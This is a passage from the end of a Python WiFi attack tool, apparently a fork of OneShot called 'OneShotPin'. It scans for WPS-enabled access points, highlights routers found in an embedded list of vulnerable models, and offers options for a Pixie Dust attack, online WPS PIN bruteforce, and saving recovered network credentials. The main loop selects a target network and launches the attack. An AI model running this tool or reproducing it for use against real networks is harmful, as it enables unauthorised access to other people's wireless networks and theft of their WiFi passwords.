                if result.group(1) == 'RSN':
                    sec = 'WPA/WPA2'
            elif sec == 'WPA2':
                if result.group(1) == 'WPA':
                    sec = 'WPA/WPA2'
            networks[-1]['Security type'] = sec

        def handle_wps(line, result, networks):
            networks[-1]['WPS'] = result.group(1)

        def handle_wpsLocked(line, result, networks):
            flag = int(result.group(1), 16)
            if flag:
                networks[-1]['WPS locked'] = True

        def handle_model(line, result, networks):
            d = result.group(1)
            networks[-1]['Model'] = (codecs.decode(d, 'unicode-escape')
                                     .encode('latin1').decode('utf-8', errors='replace'))

        def handle_modelNumber(line, result, networks):
            d = result.group(1)
            networks[-1]['Model number'] = (codecs.decode(d, 'unicode-escape')
                                            .encode('latin1').decode('utf-8', errors='replace'))

        def handle_deviceName(line, result, networks):
            d = result.group(1)
            networks[-1]['Device name'] = (codecs.decode(d, 'unicode-escape')
                                           .encode('latin1').decode('utf-8', errors='replace'))

        cmd = 'iw dev {} scan'.format(self.interface)
        proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                              stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        lines = proc.stdout.splitlines()
        networks = []
        matchers = {
            re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
            re.compile(r'SSID: (.*)'): handle_essid,
            re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handle_level,
            re.compile(r'(capability): (.+)'): handle_securityType,
            re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
            re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_wpsLocked,
            re.compile(r' [*] Model: (.*)'): handle_model,
            re.compile(r' [*] Model Number: (.*)'): handle_modelNumber,
            re.compile(r' [*] Device name: (.*)'): handle_deviceName
        }

        for line in lines:
            if line.startswith('command failed:'):
                print('[!] Error:', line)
                return False
            line = line.strip('\t')
            for regexp, handler in matchers.items():
                res = re.match(regexp, line)
                if res:
                    handler(line, res, networks)

        # Filtering non-WPS networks
        networks = list(filter(lambda x: bool(x['WPS']), networks))
        if not networks:
            return False

        # Sorting by signal level
        networks.sort(key=lambda x: x['Level'], reverse=True)

        # Putting a list of networks in a dictionary, where each key is a network number in list of networks
        network_list = {(i + 1): network for i, network in enumerate(networks)}

        # Printing scanning results as table
        def truncateStr(s, length, postfix="…"):
            """
            Truncate strings according to display width (supports Full and half width characters)
            :param s: input string
            :param length: Maximum display width (unit: column)
            :param postfix: Truncate suffixes (such as ellipses)
            """
            # Calculate the original display width
            original_width = wcwidth.wcswidth(s)
            
            # Scenario 1: The original width is exactly the same or smaller
            if original_width <= length:
                # Calculate the number of spaces to be filled (by display width)
                padding_needed = length - original_width
                # Allocate spaces evenly to the right of the string
                return s + ' ' * padding_needed
            
            # Scenario 2: Truncation is required
            postfix_width = wcwidth.wcswidth(postfix)
            max_allowed = length - postfix_width
            
            current_width = 0
            truncated = []
            for c in s:
                char_width = wcwidth.wcswidth(c)
                if current_width + char_width > max_allowed:
                    break
                truncated.append(c)
                current_width += char_width
            
            # Construct basic results
            result = "".join(truncated)
            if len(truncated) < len(s):
                result += postfix
            
            # Accurately adjust the display width
            result_width = wcwidth.wcswidth(result)
            if result_width > length:
                # Remove pre truncation restrictions and switch to more precise truncation
                # Emergency cutoff (to prevent exceeding the limit)
                # Change to character by character processing to ensure not exceeding the limit
                current_width = 0
                safe_truncated = []
                for c in result:
                    char_width = wcwidth.wcswidth(c)
                    if current_width + char_width > length:
                        break
                    safe_truncated.append(c)
                    current_width += char_width
                safe_result = "".join(safe_truncated)
                # If the truncated string becomes shorter, add ellipsis
                if len(safe_result) < len(result):
                    safe_result += postfix
                    # Recheck the width
                    if wcwidth.wcswidth(safe_result) > length:
                        # If the limit is still exceeded after adding ellipsis, remove the ellipsis
                        safe_result = safe_result[:-1]
                return safe_result
            
            # Fill in exact spaces
            padding_needed = length - result_width
            return result + ' ' * padding_needed

        def colored(text, color=None):
            """Returns colored text"""
            if color:
                if color == 'green':
                    text = '\033[92m{}\033[00m'.format(text)
                elif color == 'red':
                    text = '\033[91m{}\033[00m'.format(text)
                elif color == 'yellow':
                    text = '\033[93m{}\033[00m'.format(text)
                else:
                    return text
            else:
                return text
            return text

        if self.vuln_list:
            print('Network marks: {1} {0} {2} {0} {3}'.format(
                '|',
                colored('Possibly vulnerable', color='green'),
                colored('WPS locked', color='red'),
                colored('Already stored', color='yellow')
            ))
        print('Networks list:')
        print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'WSC device name', 'WSC model'))

        network_list_items = list(network_list.items())
        if args.reverse_scan:
            network_list_items = network_list_items[::-1]
        for n, network in network_list_items:
            number = f'{n})'
            model = '{} {}'.format(network['Model'], network['Model number'])
            essid = truncateStr(network.get('ESSID', 'HIDDEN'), 25)
            deviceName = truncateStr(network['Device name'], 27)
    
            # Processing the display width of other fields
            processed_number = truncateStr(number, 4)
            processed_bssid = truncateStr(network['BSSID'], 18)
            processed_security = truncateStr(network['Security type'], 8)
            processed_level = truncateStr(str(network['Level']), 4)
            processed_device = deviceName  # 27 columns of width have been processed
            processed_model = model  # Assuming that the model fields do not need to be truncated or have been processed
            
            # Directly concatenate the processed fields, separated by spaces in the middle
            line_parts = [
                processed_number,
                processed_bssid,
                essid,
                processed_security,
                processed_level,
                processed_device,
                processed_model
            ]
            line = ' '.join(line_parts)
            
            if (network['BSSID'], network.get('ESSID', 'HIDDEN')) in self.stored:
                print(colored(line, color='yellow'))
            elif network['WPS locked']:
                print(colored(line, color='red'))
            elif ((self.vuln_list and (model in self.vuln_list))
                  or self.checkvuln_from_pin_csv(os.path.join(os.path.dirname(os.path.realpath(__file__)),
                                                              'pins.csv'), network['BSSID'])):
                print(colored(line, color='green'))
                self._notify_vulnerable()
            else:
                print(line)

        return network_list

    def prompt_network(self) -> tuple:
        networks = self.iw_scanner()
        if not networks:
            print('[-] No WPS networks found.')
            return
        while 1:
            try:
                if sys.stdin.isatty():
                    print('Select target (10s -> auto-refresh, Enter para refrescar): ',
                          end='', flush=True)
                    ready, _, _ = select.select([sys.stdin], [], [], 10)
                    if not ready:
                        print('\n[*] Auto-refreshing network list…')
                        return self.prompt_network()
                    networkNo = sys.stdin.readline().strip()
                else:
                    networkNo = input('Select target (press Enter to refresh): ')
                if networkNo.lower() in ('r', '0', ''):
                    return self.prompt_network()
                elif int(networkNo) in networks.keys():
                    return (networks[int(networkNo)]['BSSID'],
                            networks[int(networkNo)]['ESSID'])
                else:
                    raise IndexError
            except Exception:
                print('Invalid number')


def ifaceUp(iface, down=False):
    if down:
        action = 'down'
    else:
        action = 'up'
    cmd = 'ip link set {} {}'.format(iface, action)
    res = subprocess.run(cmd, shell=True, stdout=sys.stdout, stderr=sys.stdout)
    if res.returncode == 0:
        return True
    else:
        return False


def die(msg):
    sys.stderr.write(msg + '\n')
    sys.exit(1)


def usage():
    return """
OneShotPin 0.0.2 (c) 2017 rofl0r, drygdryg and fulvius31

%(prog)s <arguments>

Required arguments:
    -i, --interface=<wlan0>  : Name of the interface to use

Optional arguments:
    -b, --bssid=<mac>        : BSSID of the target AP
    -s, --ssid=<ssid>        : SSID of the target AP
    -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
    -K, --pixie-dust         : Run Pixie Dust attack
    -B, --bruteforce         : Run online bruteforce attack
    --push-button-connect    : Run WPS push button connection

Advanced arguments:
    -d, --delay=<n>          : Set the delay between pin attempts [0]
    -w, --write              : Write AP credentials to the file on success
    -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
    -X, --show-pixie-cmd     : Always print Pixiewps command
    --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
    --iface-down             : Down network interface when the work is finished
    -l, --loop               : Run in a loop
    -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
    --mtk-wifi               : Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit
                               (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.
    -v, --verbose            : Verbose output

Example:
    %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K
"""




# --- Base de datos de vulnerables embebida (fallback si falta vulnwsc.txt) ---
VULN_DATABASE = """ADSL Router EV-2006-07-27
ADSL RT2860
AIR3G WSC Wireless Access Point AIR3G WSC Device
AirLive Wireless Gigabit AP AirLive Wireless Gigabit AP
Archer_A9 1.0
ArcherC20i 1.0
Archer A2 5.0
Archer A5 4.0
Archer C2 1.0
Archer C2 3.0
Archer C5 4.0
Archer C6 3.20
Archer C6U 1.0.0
Archer C20 1.0
Archer C20 4.0
Archer C20 5.0
Archer C50 1.0
Archer C50 3.0
Archer C50 4.0
Archer C50 5.0
Archer C50 6.0
Archer MR200 1.0
Archer MR200 4.0
Archer MR400 4.2
Archer MR200 5.0
Archer VR300 1.20
Archer VR400 3.0
Archer VR2100 1.0
B-LINK 123456
Belkin AP EV-2012-09-01
DAP-1360 DAP-1360
DIR-635 B3
DIR-819 v1.0.1
DIR-842 DIR-842
DWR-921C3 WBR-0001
D-Link N Router GO-RT-N150
D-Link Router DIR-605L
D-Link Router DIR-615H1
D-Link Router DIR-655
D-Link Router DIR-809
D-Link Router GO-RT-N150
Edimax Edimax
EC120-F5 1.0
EC220-G5 2.0
EV-2009-02-06
Enhanced Wireless Router F6D4230-4 v1
Home Internet Center KEENETIC series
Home Internet Center Keenetic series
Huawei Wireless Access Point RT2860
JWNR2000v2(Wireless AP) JWNR2000v2
Keenetic Keenetic series
Linksys Wireless Access Point EA7500
Linksys Wireless Router WRT110
NBG-419N NBG-419N
Netgear AP EV-2012-08-04
NETGEAR Wireless Access Point NETGEAR
NETGEAR Wireless Access Point R6220
NETGEAR Wireless Access Point R6260
N/A EV-2010-09-20
Ralink Wireless Access Point RT2860
Ralink Wireless Access Point WR-AC1210
RTL8196E
RTL8xxx EV-2009-02-06
RTL8xxx EV-2010-09-20
RTL8xxx RTK_ECOS
RT-G32 1234
Sitecom Wireless Router 300N X2 300N
Smart Router R3 RT2860
Tenda 123456
Timo RA300R4 Timo RA300R4
TD-W8151N RT2860
TD-W8901N RT2860
TD-W8951ND RT2860
TD-W9960 1.0
TD-W9960 1.20
TD-W9960v 1.0
TD-W8968 2.0
TEW-731BR TEW-731BR
TL-MR100 1.0
TL-MR3020 3.0
TL-MR3420 5.0
TL-MR6400 3.0
TL-MR6400 4.0
TL-WA855RE 4.0
TL-WR840N 4.0
TL-WR840N 5.0
TL-WR840N 6.0
TL-WR841N 13.0
TL-WR841N 14.0
TL-WR841HP 5.0
TL-WR842N 5.0
TL-WR845N 3.0
TL-WR845N 4.0
TL-WR850N 1.0
TL-WR850N 2.0
TL-WR850N 3.0
TL-WR1042N EV-2010-09-20
Trendnet router TEW-625br
Trendnet router TEW-651br
VN020-F3 1.0
VMG3312-T20A RT2860
VMG8623-T50A RT2860
WAP300N WAP300N
WAP3205 WAP3205
Wi-Fi Protected Setup Router RT-AC1200G+
Wi-Fi Protected Setup Router RT-AX55
Wi-Fi Protected Setup Router RT-N10U
Wi-Fi Protected Setup Router RT-N12
Wi-Fi Protected Setup Router RT-N12D1
Wi-Fi Protected Setup Router RT-N12VP
Wireless Access Point .
Wireless Router 123456
Wireless Router RTL8xxx EV-2009-02-06
Wireless Router Wireless Router
Wireless WPS Router <#ZVMODELVZ#>
Wireless WPS Router RT-N10E
Wireless WPS Router RT-N10LX
Wireless WPS Router RT-N12E
Wireless WPS Router RT-N12LX
WN3000RP V3
WN-200R WN-200R
WPS Router (5G) RT-N65U
WPS Router DSL-AC51
WPS Router DSL-AC52U
WPS Router DSL-AC55U
WPS Router DSL-N14U-B1
WPS Router DSL-N16
WPS Router DSL-N17U
WPS Router RT-AC750
WPS Router RT-AC1200
WPS Router RT-AC1200_V2
WPS Router RT-AC1750
WPS Router RT-AC750L
WPS Router RT-AC1750U
WPS Router RT-AC51
WPS Router RT-AC51U
WPS Router RT-AC52U
WPS Router RT-AC52U_B1
WPS Router RT-AC53
WPS Router RT-AC57U
WPS Router RT-AC65P
WPS Router RT-AC85P
WPS Router RT-N11P
WPS Router RT-N12E
WPS Router RT-N12E_B1
WPS Router RT-N12 VP
WPS Router RT-N12+
WPS Router RT-N14U
WPS Router RT-N56U
WPS Router RT-N56UB1
WPS Router RT-N65U
WPS Router RT-N300
WR5570 2011-05-13
ZyXEL NBG-416N AP Router
ZyXEL NBG-416N AP Router NBG-416N
ZyXEL NBG-418N AP Router
ZyXEL NBG-418N AP Router NBG-418N
ZyXEL Wireless AP Router NBG-417N
Modem/Router EV-2010-09-20
RB06 RT2860
RB03 RT2860
"""


if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(
        description='OneShotPin 0.0.2 (c) 2017 rofl0r, drygdryg and fulvius31',
        epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K'
        )

    parser.add_argument(
        '-i', '--interface',
        type=str,
        required=True,
        help='Name of the interface to use'
        )
    parser.add_argument(
        '-b', '--bssid',
        type=str,
        help='BSSID of the target AP'
        )
    parser.add_argument(
        '-s', '--ssid',
        type=str,
        help='SSID of the target AP'
        )
    parser.add_argument(
        '-p', '--pin',
        type=str,
        help='Use the specified pin (arbitrary string or 4/8 digit pin)'
        )
    parser.add_argument(
        '-K', '--pixie-dust',
        action='store_true',
        help='Run Pixie Dust attack'
        )
    parser.add_argument(
        '-F', '--pixie-force',
        action='store_true',
        help='Run Pixiewps with --force option (bruteforce full range)'
        )
    parser.add_argument(
        '-X', '--show-pixie-cmd',
        action='store_true',
        help='Always print Pixiewps command'
        )
    parser.add_argument(
        '-B', '--bruteforce',
        action='store_true',
        help='Run online bruteforce attack'
        )
    parser.add_argument(
        '--pbc', '--push-button-connect',
        action='store_true',
        help='Run WPS push button connection'
        )
    parser.add_argument(
        '-d', '--delay',
        type=float,
        help='Set the delay between pin attempts'
        )
    parser.add_argument(
        '-w', '--write',
        action='store_true',
        help='Write credentials to the file on success'
        )
    parser.add_argument(
        '--iface-down',
        action='store_true',
        help='Down network interface when the work is finished'
        )
    parser.add_argument(
        '--vuln-list',
        type=str,
        default=os.path.dirname(os.path.realpath(__file__)) + '/vulnwsc.txt',
        help='Use custom file with vulnerable devices list'
        )
    parser.add_argument(
        '-l', '--loop',
        action='store_true',
        help='Run in a loop'
        )
    parser.add_argument(
        '-r', '--reverse-scan',
        action='store_true',
        help='Reverse order of networks in the list of networks. Useful on small displays'
        )
    parser.add_argument(
        '--mtk-wifi',
        action='store_true',
        help='Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit '
             '(for internal Wi-Fi adapters implemented in MediaTek SoCs). '
             'Turn off Wi-Fi in the system settings before using this.'
        )
    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Verbose output'
        )

    args = parser.parse_args()

    if sys.hexversion < 0x03060F0:
        die("The program requires Python 3.6 and above")
    if os.getuid() != 0:
        die("Run it as root")

    if args.mtk_wifi:
        wmtWifi_device = Path("/dev/wmtWifi")
        if not wmtWifi_device.is_char_device():
            die("Unable to activate MediaTek Wi-Fi interface device (--mtk-wifi): "
                "/dev/wmtWifi does not exist or it is not a character device")
        wmtWifi_device.chmod(0o644)
        wmtWifi_device.write_text("1")

    if not ifaceUp(args.interface):
        die('Unable to up interface "{}"'.format(args.interface))

    while True:
        try:
            companion = Companion(args.interface, args.write, print_debug=args.verbose)
            if args.pbc:
                companion.single_connection(pbc_mode=True)
            else:
                if not args.bssid:
                    try:
                        with open(args.vuln_list, 'r', encoding='utf-8') as file:
                            vuln_list = file.read().splitlines()
                    except FileNotFoundError:
                        # BD de vulnerables embebida si no existe vulnwsc.txt
                        vuln_list = VULN_DATABASE.strip().splitlines()
                    scanner = WiFiScanner(args.interface, vuln_list)
                    if not args.loop:
                        print('[*] BSSID not specified (--bssid) — scanning for available networks')

                    network_info = scanner.prompt_network()
                    if network_info:
                        args.bssid = network_info[0]
                        args.ssid = network_info[1] if len(network_info) > 1 else None
                if args.bssid:
                    companion = Companion(args.interface, args.write, print_debug=args.verbose)
                    if args.bruteforce:
                        companion.smart_bruteforce(args.bssid, args.pin, args.delay)
                    else:
                        companion.single_connection(bssid=args.bssid, ssid=args.ssid, pin=args.pin,
                                                    pixiemode=args.pixie_dust, pbc_mode=args.pbc,
                                                    showpixiecmd=args.show_pixie_cmd,
                                                    pixieforce=args.pixie_force)
            if not args.loop:
                break
            else:
                args.bssid = None
        except KeyboardInterrupt:
            if args.loop:
                if input("\n[?] Exit the script (otherwise continue to AP scan)? [N/y] ").lower() == 'y':
                    print("Aborting…")
                    break
                else:
                    args.bssid = None
            else:
                print("\nAborting…")
                break

    if args.iface_down:
        ifaceUp(args.interface, down=True)

    if args.mtk_wifi:
        wmtWifi_device.write_text("0")
